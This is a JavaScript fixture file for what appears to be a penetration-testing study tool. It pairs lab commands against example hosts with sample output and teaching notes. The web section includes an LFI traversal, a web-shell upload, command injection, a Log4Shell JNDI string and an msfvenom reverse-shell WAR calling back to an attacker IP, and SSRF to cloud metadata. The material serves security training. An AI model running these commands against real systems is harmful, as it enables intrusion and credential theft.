/*!
 * obol data — study-fixtures.js — OBOL.STUDY_FIXTURES
 *
 * The one piece of the study cell NOT derivable from the packs: a representative sample of what each
 * move's output looks like, the one line that matters ("signal"), and a plain teach note about why.
 *
 * COHERENCE CONTRACT (enforced by tests/engine/study-smoke.js): every fixture pins `cmd` — the exact
 * command its `output` came from — and the Watch replay types THAT command above the result. `tool`
 * is its tool. The output is pure tool result: it never re-types a `$ command` echo, so the command
 * the learner sees and the output below it are always one real run, never a sample paired against a
 * different command. `signal` is one real line of the output (the evidence that matters).
 *
 * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear; they are merged in
 * from PRACTICE at the bottom. The verdict for each choice (correct / also-valid / locked) is computed
 * in study.js from the real requires — only the choice set and nuance coaching live here.
 *
 * Commands and outputs use consistent example values: target 10.10.10.10, domain acme.internal (ACME),
 * DC01, attacker 10.10.14.5, an internal segment 172.16.5.0/24. They are invocation + sample output
 * only — the methodology, not weaponised payloads.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.STUDY_FIXTURES = {

    // ============================ RECON ============================
    'nmap-fast-open-ports': {
      cmd: 'nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.10.10.10', tool: 'nmap',
      output: [
        'Nmap scan report for 10.10.10.10',
        'Host is up (0.021s latency).',
        'Not shown: 65532 closed tcp ports (reset)',
        'PORT     STATE SERVICE',
        '22/tcp   open  ssh',
        '80/tcp   open  http',
        '445/tcp  open  microsoft-ds',
      ].join('\n'),
      signal: '80/tcp   open  http',
      teach: 'Every open port is a door. A fast all-ports sweep first tells you what to look at (here SSH, a web server, and SMB) before you spend time on any one service.',
    },
    'nmap-version-scripts': {
      cmd: 'nmap -Pn -sC -sV -p 22,80,445 -oN scans/nmap-version.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE VERSION',
        '22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5',
        '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
        '|_http-title: Acme Corp Intranet',
        '445/tcp open  netbios-ssn Samba smbd 4.6.2',
      ].join('\n'),
      signal: '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
      teach: 'Versions are leads. "Apache 2.4.49" is a specific, searchable build, many such versions have a public CVE. Always pull the version before deciding how to attack a service.',
    },
    'nmap-vuln-scripts': {
      cmd: 'nmap -Pn -sV --script vuln -p 80 -oN scans/nmap-vuln.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT   STATE SERVICE VERSION',
        '80/tcp open  http    Apache httpd 2.4.49 ((Unix))',
        '| http-vuln-cve2021-41773:',
        '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
        '|_    References: https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
      ].join('\n'),
      signal: '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
      teach: 'The vuln scripts run safe-ish checks that flag known CVEs on the open ports. Treat a VULNERABLE line as a strong lead to verify, not a guaranteed win, scripts can false-positive, so confirm before you commit.',
    },
    'nmap-udp-top': {
      cmd: 'sudo nmap -Pn -sU --top-ports 20 --open -oN scans/nmap-udp-top20.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE',
        '53/udp  open  domain',
        '161/udp open  snmp',
      ].join('\n'),
      signal: '161/udp open  snmp',
      teach: 'TCP is only half the surface. A quick UDP sweep of the top ports finds the services people forget (SNMP on 161, DNS on 53, TFTP on 69), and each is its own way in.',
    },
    'recon-smb-anon': {
      cmd: "nxc smb 10.10.10.10 -u '' -p '' --shares", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  FILE01  [*] Windows Server 2019 Build 17763 (name:FILE01) (domain:acme.internal) (signing:False)',
        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\: (Guest)',
        'SMB  10.10.10.10  445  FILE01  Share       Permissions   Remark',
        'SMB  10.10.10.10  445  FILE01  IPC$                      Remote IPC',
        'SMB  10.10.10.10  445  FILE01  Profiles    READ',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  FILE01  Profiles    READ',
      teach: 'An anonymous ("-u \'\' -p \'\'") SMB check costs nothing and often hands you a readable share and the domain name. A READ share like Profiles is a place to hunt for files; the banner also leaks that signing is off.',
    },
    'recon-web-triage': {
      cmd: 'whatweb -a3 http://10.10.10.10', tool: 'whatweb',
      output: [
        'http://10.10.10.10 [200 OK] Apache[2.4.49], HTTPServer[Unix][Apache/2.4.49 (Unix)],',
        'IP[10.10.10.10], PHP[7.4.3], Title[Acme Corp Intranet], X-Powered-By[PHP/7.4.3]',
      ].join('\n'),
      signal: 'Apache[2.4.49]',
      teach: 'whatweb fingerprints the stack in one request, web server, language, CMS, title. Knowing it is Apache 2.4.49 + PHP 7.4 steers which exploits and wordlists make sense before you touch the site further.',
    },
    'recon-dns': {
      cmd: 'dig axfr acme.internal @10.10.10.10', tool: 'dig',
      output: [
        '; <<>> DiG 9.18.12 <<>> axfr acme.internal @10.10.10.10',
        'acme.internal.          604800 IN SOA dc01.acme.internal. admin.acme.internal. 3 604800 86400',
        'dc01.acme.internal.     604800 IN A   10.10.10.10',
        'dev.acme.internal.      604800 IN A   10.10.10.25',
        'intranet.acme.internal. 604800 IN A   10.10.10.30',
      ].join('\n'),
      signal: 'intranet.acme.internal. 604800 IN A   10.10.10.30',
      teach: 'A DNS zone transfer (AXFR) that succeeds hands you the whole internal name map in one request, every host and subdomain the admin forgot to lock down. Those new names are new targets.',
    },
    'recon-snmp': {
      cmd: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10', tool: 'onesixtyone',
      output: [
        'Scanning 1 hosts, 3220 communities',
        '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
      ].join('\n'),
      signal: '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
      teach: 'An SNMP community string of "public" is a default nobody changed. onesixtyone confirms it answers; with it (via snmpwalk) you can read running processes, users, and sometimes credentials, no login required.',
    },
    'recon-ike-vpn': {
      cmd: 'sudo ike-scan -M 10.10.10.10', tool: 'ike-scan',
      output: [
        'Starting ike-scan 1.9.5 with 1 hosts',
        '10.10.10.10  Main Mode Handshake returned',
        '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
        'Ending ike-scan: 1 hosts scanned, 1 returned handshake',
      ].join('\n'),
      signal: '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
      teach: 'An IKE/IPsec VPN on UDP 500 reveals its crypto. A dated 3DES/SHA1/PSK config is a finding on its own, and if the server also allows Aggressive Mode (ike-scan -A) it will hand back a PSK hash you can crack offline.',
    },
    'recon-finger': {
      cmd: 'finger @10.10.10.10', tool: 'finger',
      output: [
        'Login     Name          Tty   Idle  Login Time',
        'root      root          *:0     1d  Mon 09:14',
        'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
      ].join('\n'),
      signal: 'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
      teach: 'The finger service (port 79) is ancient but still appears on old Unix boxes. It leaks real usernames and who is logged in, bmurphy is a confirmed account to spray or brute.',
    },
    'recon-vnc': {
      cmd: 'nmap -p 5900,5901 --script vnc-info,realvnc-auth-bypass 10.10.10.10', tool: 'nmap',
      output: [
        'PORT     STATE SERVICE',
        '5900/tcp open  vnc',
        '| vnc-info:',
        '|   Protocol version: 3.8',
        '|   Security types:',
        '|_    None (1) - no password required',
      ].join('\n'),
      signal: '|_    None (1) - no password required',
      teach: 'A VNC server that offers "None" security is an unauthenticated remote desktop, connect and you are on the box\'s screen. Even when it wants a password, VNC passwords are short and crackable.',
    },
    'recon-smtp': {
      cmd: 'smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10', tool: 'smtp-user-enum',
      output: [
        'Starting smtp-user-enum v1.2',
        '10.10.10.10: root exists',
        '10.10.10.10: bmurphy exists',
        '10.10.10.10: nonexistent does not exist',
      ].join('\n'),
      signal: '10.10.10.10: bmurphy exists',
      teach: 'An SMTP server that answers VRFY confirms which usernames are real. A confirmed user list is the raw material for a password spray or a brute, you stop guessing names and start guessing passwords.',
    },
    'recon-ftp': {
      cmd: "nxc ftp 10.10.10.10 -u anonymous -p ''", tool: 'nxc',
      output: [
        'FTP  10.10.10.10  21  FTP01  [*] Banner: 220 (vsFTPd 3.0.3)',
        'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
        'FTP  10.10.10.10  21  FTP01  -rw-r--r-- 1 ftp ftp 1024 Jan 08 09:12 backup.zip',
      ].join('\n'),
      signal: 'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
      teach: 'Anonymous FTP is a free login, always test it. A readable file like backup.zip often holds source, configs, or credentials; download everything and look through it.',
    },
    'recon-mail': {
      cmd: 'nmap -sV -p 110,143,993,995 --script pop3-capabilities,pop3-ntlm-info 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE',
        '110/tcp open  pop3',
        '143/tcp open  imap',
        '|_pop3-capabilities: USER TOP UIDL',
        '| pop3-ntlm-info:',
        '|_  Domain: ACME',
      ].join('\n'),
      signal: '|_  Domain: ACME',
      teach: 'Mail services leak more than you expect: capabilities, and via NTLM auth the internal domain name (ACME). With a valid mailbox credential you can read mail for secrets, reset links, and internal contacts.',
    },
    'rdp-enum': {
      cmd: "nxc rdp 10.10.10.10 -u bmurphy -p 'Summer2024!'", tool: 'nxc',
      output: [
        'RDP  10.10.10.10  3389  TARGET  [*] Windows 10 / Server 2019 Build 17763 (name:TARGET) (domain:ACME)',
        'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
      ].join('\n'),
      signal: 'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
      teach: '"Pwn3d!" on an RDP check means the credentials you tested actually log in, you have an interactive desktop waiting (connect with xfreerdp). Always confirm which creds work against which service.',
    },
    'nfs-enum': {
      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
      output: [
        'Export list for 10.10.10.10:',
        '/srv/home    *',
        '/var/backups 10.10.10.0/24',
      ].join('\n'),
      signal: '/srv/home    *',
      teach: 'An NFS export shared with "*" is readable by anyone who mounts it. Mount it locally and you can read other users\' files, and often, with a matching UID, write them too. A classic foothold and privesc in one.',
    },

    // ============================ WEB ============================
    'vhost-discovery': {
      cmd: 'ffuf -u http://10.10.10.10 -H "Host: FUZZ.acme.internal" -w subdomains.txt -mc 200,301,302 -fs 0', tool: 'ffuf',
      output: [
        ':: Method           : GET',
        'dev                     [Status: 200, Size: 5210, Words: 412, Lines: 98]',
        'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
      ].join('\n'),
      signal: 'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
      teach: 'One IP can serve many sites by Host header. Fuzzing virtual hosts surfaces ones with no public link, a "staging" or "dev" vhost is usually less hardened than production and is where the bug lives.',
    },
    'content-discovery': {
      cmd: 'feroxbuster -u http://10.10.10.10 -w raft-medium-directories.txt -o scans/ferox.txt', tool: 'feroxbuster',
      output: [
        '200      GET       24l       68w     /index.php',
        '301      GET        9l       28w     /uploads => http://10.10.10.10/uploads/',
        '200      GET       11l       33w     /admin/login.php',
        '403      GET        9l       28w     /.git',
      ].join('\n'),
      signal: '200      GET       11l       33w     /admin/login.php',
      teach: 'Brute-forcing paths uncovers what is not linked anywhere, an admin login, an uploads directory, a leaking .git. Each hit is a new place to attack; chase the interesting ones (admin, upload, config) first.',
    },
    'param-discovery': {
      cmd: 'arjun -u http://10.10.10.10/view.php -m GET', tool: 'arjun',
      output: [
        '[*] Scanning http://10.10.10.10/view.php',
        '[*] Analysing HTTP response for anomalies',
        '[+] Parameter detected: page, based on: status code, body length',
      ].join('\n'),
      signal: '[+] Parameter detected: page, based on: status code, body length',
      teach: 'A page can hide inputs that nothing links to. arjun fuzzes parameter names and watches the response change, finding a hidden "page" parameter gives you something to test for LFI, SQLi, or SSRF.',
    },
    'lfi-probe': {
      cmd: "curl -s 'http://10.10.10.10/view.php?page=../../../../etc/passwd'", tool: 'curl',
      output: [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'bmurphy:x:1000:1000:Bob Murphy:/home/bmurphy:/bin/bash',
      ].join('\n'),
      signal: 'root:x:0:0:root:/root:/bin/bash',
      teach: 'When /etc/passwd comes back in the page, the "page" parameter reads arbitrary files, Local File Inclusion. It confirms traversal and leaks real usernames (bmurphy); next you try log poisoning or PHP wrappers for code execution.',
    },
    'file-upload': {
      cmd: 'curl -s -F "file=@shell.php" http://10.10.10.10/upload.php', tool: 'curl',
      output: [
        '{"status":"ok","stored":"/uploads/shell.php"}',
      ].join('\n'),
      signal: '{"status":"ok","stored":"/uploads/shell.php"}',
      teach: 'The upload accepted a .php file and told you where it landed. If /uploads/ executes PHP, requesting shell.php runs your code, upload-to-webshell. Many filters are weak (check extension tricks, content-type, magic bytes).',
    },
    'sqli-basics': {
      cmd: "curl -s 'http://10.10.10.10/page.php?id=1%27'", tool: 'curl',
      output: [
        'You have an error in your SQL syntax; check the manual that',
        "corresponds to your MySQL server version for the right syntax near '''",
      ].join('\n'),
      signal: 'You have an error in your SQL syntax; check the manual that',
      teach: 'A single quote that throws a SQL error means your input reaches the query unescaped, the first proof of SQL injection. From here you find the column count and start extracting data (or hand it to sqlmap).',
    },
    'sqlmap-automation': {
      cmd: 'sqlmap -r request.txt --batch --level=3 --risk=2 --dump', tool: 'sqlmap',
      output: [
        "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
        '[INFO] the back-end DBMS is MySQL',
        'Database: appdb',
        'Table: users',
        '| id | username | password                         |',
        '| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |',
      ].join('\n'),
      signal: "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
      teach: 'Once you have confirmed injection by hand, sqlmap automates the extraction, it enumerates databases, tables, and dumps rows. Those password hashes go straight to your cracker. Use -r with a saved request so it tests the real parameters.',
    },
    'git-exposed': {
      cmd: 'git-dumper http://10.10.10.10/.git/ gitloot', tool: 'git-dumper',
      output: [
        '[+] Testing http://10.10.10.10/.git/HEAD [200]',
        '[+] Fetching .git/ ...',
        '[+] Running git checkout .',
        'Repository reconstructed in gitloot/',
        'config.php:  $db_pass = "SourceOnly2026!";',
      ].join('\n'),
      signal: 'config.php:  $db_pass = "SourceOnly2026!";',
      teach: 'An exposed .git/ directory lets git-dumper reconstruct the whole source tree, including secrets committed by mistake. A database password in config.php is a free credential and a read of exactly how the app works.',
    },
    'svn-exposed': {
      cmd: 'curl -s http://10.10.10.10/.svn/entries', tool: 'curl',
      output: [
        '10',
        'dir',
        'https://svn.acme.internal/app',
        'config.php',
        'db_connect.php',
      ].join('\n'),
      signal: 'db_connect.php',
      teach: 'An exposed .svn/ directory leaks the source tree the way .git/ does. The entries file lists real filenames, db_connect.php likely holds database credentials. Reconstruct the files and read them.',
    },
    'ssrf': {
      cmd: "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'", tool: 'curl',
      output: [
        '{',
        '  "AccessKeyId": "AKIAEXAMPLE123",',
        '  "SecretAccessKey": "wJalrXUtnFEMI/EXAMPLEKEY",',
        '  "Token": "IQoJb3JpZ2luX2VjE..."',
        '}',
      ].join('\n'),
      signal: '  "AccessKeyId": "AKIAEXAMPLE123",',
      teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at the cloud metadata endpoint (169.254.169.254) it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
    },
    'ssti': {
      cmd: "curl -s 'http://10.10.10.10/hello?user={{7*7}}'", tool: 'curl',
      output: [
        '<h1>Hello 49</h1>',
      ].join('\n'),
      signal: '<h1>Hello 49</h1>',
      teach: 'You sent {{7*7}} and the page returned 49, the template engine evaluated your input instead of printing it. Server-Side Template Injection often escalates straight to remote code execution; identify the engine, then build the RCE payload.',
    },
    'xxe': {
      cmd: 'curl -s -X POST http://10.10.10.10/api -H "Content-Type: application/xml" --data-binary @xxe.xml', tool: 'curl',
      output: [
        '<result>',
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        '</result>',
      ].join('\n'),
      signal: 'root:x:0:0:root:/root:/bin/bash',
      teach: 'XML External Entity injection abuses a parser that resolves external entities. Your payload declares one pointing at file:///etc/passwd and the response echoes the file back. Any endpoint that accepts XML is worth testing.',
    },
    'deserialization': {
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
      teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. Start a listener, then POST the gadget blob, the app runs it and dials back to you. Look for serialised data in cookies, parameters, and APIs.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
        { where: 'local', tool: 'curl', cmd: 'curl -s -X POST http://10.10.10.10/api --data-binary @cc5-payload.bin', output: [
          '↩ the app deserialised it and ran your gadget, caught on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
          'uid=0(root) gid=0(root) groups=0(root)',
        ].join('\n') },
      ],
    },
    'jwt-attacks': {
      cmd: "echo $TOKEN | cut -d. -f2 | base64 -d", tool: 'sh',
      output: [
        '{"user":"guest","role":"user","iat":1700000000}',
      ].join('\n'),
      signal: '{"user":"guest","role":"user","iat":1700000000}',
      teach: 'Decode the token first, the middle segment is the claims. If the server accepts alg:none, or the HMAC secret is weak enough to crack (hashcat -m 16500), you re-sign a token that says role:admin. The claims tell you exactly what to tamper with.',
    },
    'nosql-injection': {
      cmd: "curl -s -i -X POST http://10.10.10.10/login -d 'user[$ne]=x&pass[$ne]=x'", tool: 'curl',
      output: [
        'HTTP/1.1 302 Found',
        'Location: /dashboard',
        'Set-Cookie: session=loggedin-as-admin; Path=/',
      ].join('\n'),
      signal: 'Set-Cookie: session=loggedin-as-admin; Path=/',
      teach: 'NoSQL backends like MongoDB take query operators as input. {"$ne":"x"} means "not equal to x" (always true), so the login matches the first user and you are in without a password. Test JSON and array parameters against NoSQL apps.',
    },
    'tomcat-deploy': {
      signal: 'OK - Deployed application at context path [/shell]',
      teach: 'Tomcat Manager with valid creds lets you deploy a WAR (your own app) which runs as the Tomcat service account. First build the WAR on your box, then upload it; "OK - Deployed" means your JSP shell is live at /shell. Request it to get code execution.',
      steps: [
        { where: 'local', tool: 'msfvenom', cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o rev.war', output: [
          'Payload size: 1098 bytes',
          'Final size of war file: 1098 bytes',
          'Saved as: rev.war',
        ].join('\n') },
        { where: 'local', tool: 'curl', cmd: "curl -u 'tomcat:s3cret' 'http://10.10.10.10:8080/manager/text/deploy?path=/shell' --upload-file rev.war", output: 'OK - Deployed application at context path [/shell]' },
      ],
    },
    'jenkins-access': {
      cmd: "curl -s http://10.10.10.10:8080/script --data-urlencode 'script=println \"id\".execute().text'", tool: 'curl',
      output: [
        'uid=0(root) gid=0(root) groups=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root) groups=0(root)',
      teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service, often root or a privileged build account. If /script is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run privileged.',
    },
    'wordpress': {
      cmd: 'wpscan --url http://10.10.10.10 --enumerate u,vp --api-token $WPSCAN_API', tool: 'wpscan',
      output: [
        '[+] URL: http://10.10.10.10/  [10.10.10.10]',
        '[+] WordPress version 5.8.1 identified',
        '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
        '[i] User(s) Identified: admin, editor',
      ].join('\n'),
      signal: '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
      teach: 'wpscan maps a WordPress site: core version, plugins, and users. Plugins are where WordPress boxes fall, a vulnerable one like wp-file-manager is often a direct RCE. The enumerated users feed a login brute if you need one.',
    },
    'nikto-scan': {
      cmd: 'nikto -h http://10.10.10.10 -o scans/nikto.txt', tool: 'nikto',
      output: [
        '+ Server: Apache/2.4.49 (Unix)',
        '+ /admin/: This might be interesting.',
        '+ OSVDB-3233: /icons/README: Apache default file found.',
        '+ /cgi-bin/: Directory indexing found.',
      ].join('\n'),
      signal: '+ /admin/: This might be interesting.',
      teach: 'Nikto is a fast first pass that flags the obvious, default files, an exposed /admin, a dated banner. Treat each hit as a lead to chase by hand, not a finding on its own.',
    },
    'command-injection': {
      cmd: "curl -s 'http://10.10.10.10/ping.php?ip=127.0.0.1;id'", tool: 'curl',
      output: [
        'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
        '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.04 ms',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      teach: 'The app ran your ;id alongside its ping, the uid=www-data line is the web server executing your command. That is command injection, and it is a direct path to a reverse shell as the web user.',
    },
    'idor': {
      cmd: "curl -s 'http://10.10.10.10/account?id=1002' -H 'Cookie: session=<yours>'", tool: 'curl',
      output: [
        '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
        ' "role":"customer","card_last4":"4417","balance":"42.10"}',
      ].join('\n'),
      signal: '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
      teach: 'You changed id=1001 (yours) to id=1002 and got someone else\'s record, an Insecure Direct Object Reference. The app checks that you are logged in, but not that the object is yours. Walk the IDs to harvest other users\' data.',
    },
    'verb-tampering': {
      cmd: 'curl -s -X OPTIONS -i http://10.10.10.10/admin/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Allow: GET, POST, PUT, OPTIONS',
      ].join('\n'),
      signal: 'Allow: GET, POST, PUT, OPTIONS',
      teach: 'OPTIONS tells you which verbs the server accepts. PUT in the list on /admin/ is a red flag, you may be able to upload a web shell with a PUT, no injection needed. Enumerate methods before assuming a path is locked down.',
    },
    'web-shells': {
      cmd: "curl -s 'http://10.10.10.10/uploads/cmd.php?c=id'", tool: 'curl',
      output: [
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      teach: 'Once your uploaded web shell runs commands (?c=id returns www-data), you have code execution, but one command per request is clumsy. The very next move is to turn it into a proper interactive reverse shell.',
    },
    'xss-basics': {
      cmd: "curl -s 'http://10.10.10.10/search.php?q=<b>xssprobe123</b>'", tool: 'curl',
      output: [
        '<p>No results for <b>xssprobe123</b></p>',
      ].join('\n'),
      signal: '<p>No results for <b>xssprobe123</b></p>',
      teach: 'Your <b> tag came back rendered, not escaped, the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing a session. On OSCP it matters most where it can reach an admin.',
    },
    'check-log4shell': {
      signal: 'Received LDAP query from 10.10.10.10 for object /a',
      teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your ${jndi:ldap://...} string and dutifully connects out to it. Stand up a listener first, then inject the string, the inbound LDAP hit confirms the callback, the first step before staging a full exploit.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 1389', output: 'Listening on 0.0.0.0 1389' },
        { where: 'local', tool: 'curl', cmd: "curl -sSkL http://10.10.10.10/ -H 'User-Agent: ${jndi:ldap://10.10.14.5:1389/a}'", output: [
          '↩ the target logged the string and connected back:',
          'Received LDAP query from 10.10.10.10 for object /a',
        ].join('\n') },
      ],
    },
    'check-struts2': {
      cmd: 'curl -sSk http://10.10.10.10/ -H "Content-Type: %{(#cmd=\'id\')...OGNL...}"', tool: 'curl',
      output: [
        'uid=0(root) gid=0(root) groups=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root) groups=0(root)',
      teach: 'Apache Struts2 OGNL injection (e.g. CVE-2017-5638) evaluates an attacker expression in the Content-Type header and runs commands, here as root. A dated Struts app is often a one-request shell; fingerprint the framework version first.',
    },

    // ============================ SERVICE & WEB CHECKS ============================
    'check-tls-config': {
      cmd: 'nmap --script ssl-cert,ssl-enum-ciphers -p 443 10.10.10.10', tool: 'nmap',
      output: [
        '| ssl-cert: Subject: commonName=dev.acme.internal',
        '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
        '|_  Not valid after:  2025-11-01T00:00:00',
        '| ssl-enum-ciphers:',
        '|_  TLSv1.0: (weak)',
      ].join('\n'),
      signal: '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
      teach: 'A TLS certificate leaks names. The Subject and SAN fields often reveal internal hostnames (like vault.acme.internal) you had no other way to discover. The cipher list and expiry are reporting findings too.',
    },
    'check-http-methods': {
      cmd: 'curl -sSIkLX OPTIONS http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
      ].join('\n'),
      signal: 'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
      teach: 'OPTIONS reports which verbs the server accepts. PUT or DELETE in the list is a red flag, PUT can mean you upload a web shell directly, no injection needed.',
    },
    'check-cors': {
      cmd: 'curl -sSIkL -H "Origin: https://evil.example" http://10.10.10.10/api/me', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Access-Control-Allow-Origin: https://evil.example',
        'Access-Control-Allow-Credentials: true',
      ].join('\n'),
      signal: 'Access-Control-Allow-Origin: https://evil.example',
      teach: 'The server reflected your arbitrary Origin AND allows credentials, a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous pair.',
    },
    'check-http-redirect': {
      cmd: 'curl -sSIk http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 301 Moved Permanently',
        'Location: https://dev-internal.acme.internal/',
      ].join('\n'),
      signal: 'Location: https://dev-internal.acme.internal/',
      teach: 'A redirect can leak an internal hostname in its Location header, dev-internal.acme.internal is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
    },
    'check-subdomain-takeover': {
      cmd: 'dig +noall +answer CNAME shop.acme.internal', tool: 'dig',
      output: [
        'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
      ].join('\n'),
      signal: 'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
      teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. Confirm by visiting it and seeing an unclaimed-app page.',
    },
    'check-dns-email': {
      cmd: 'dig +short TXT _dmarc.acme.internal', tool: 'dig',
      output: [
        '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
      ].join('\n'),
      signal: '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
      teach: 'Email records say whether a domain can be spoofed. DMARC p=none means forged mail from this domain is unlikely to be rejected, a phishing lead in a real engagement, a reporting finding on the exam.',
    },
    'check-web-headers': {
      cmd: 'curl -sSIkL http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Server: Apache/2.4.49 (Unix)',
        'X-Powered-By: PHP/7.4.3',
        '# (no Content-Security-Policy, no X-Frame-Options)',
      ].join('\n'),
      signal: 'X-Powered-By: PHP/7.4.3',
      teach: 'Response headers hand you the stack for free and show what protections are missing. X-Powered-By leaks the PHP version; the absence of CSP and X-Frame-Options are reporting findings. Read the headers before anything clever.',
    },
    'check-web-components': {
      cmd: 'curl -sSikL http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Server: Apache/2.4.49 (Unix)',
        'Set-Cookie: PHPSESSID=8f2...; path=/',
        '<meta name="generator" content="Joomla! 3.9">',
      ].join('\n'),
      signal: '<meta name="generator" content="Joomla! 3.9">',
      teach: 'Between the headers and the page body, the component stack is usually visible, here a generator meta tag names Joomla 3.9. A pinned CMS version maps straight to known exploits; identify it before you attack.',
    },
    'check-cms-version': {
      cmd: 'curl -sSkL http://10.10.10.10/CHANGELOG.txt', tool: 'curl',
      output: [
        'Drupal 7.57, 2018-02-21',
        '----------------------',
      ].join('\n'),
      signal: 'Drupal 7.57, 2018-02-21',
      teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2, CVE-2018-7600). Identify the CMS and its exact build, then look up what breaks it.',
    },
    'check-web-body': {
      cmd: 'curl -sSkL http://10.10.10.10/', tool: 'curl',
      output: [
        '<form action="/login.php" method="post">',
        '<!-- TODO: remove test login test/test before go-live -->',
        '</form>',
      ].join('\n'),
      signal: '<!-- TODO: remove test login test/test before go-live -->',
      teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A test/test login left in a comment is a free set of working credentials, read the page humans never read.',
    },
    'check-exposed-files': {
      cmd: 'curl -sSkL http://10.10.10.10/.env', tool: 'curl',
      output: [
        'APP_ENV=production',
        'DB_HOST=127.0.0.1',
        'DB_PASSWORD=sup3rs3cret',
      ].join('\n'),
      signal: 'DB_PASSWORD=sup3rs3cret',
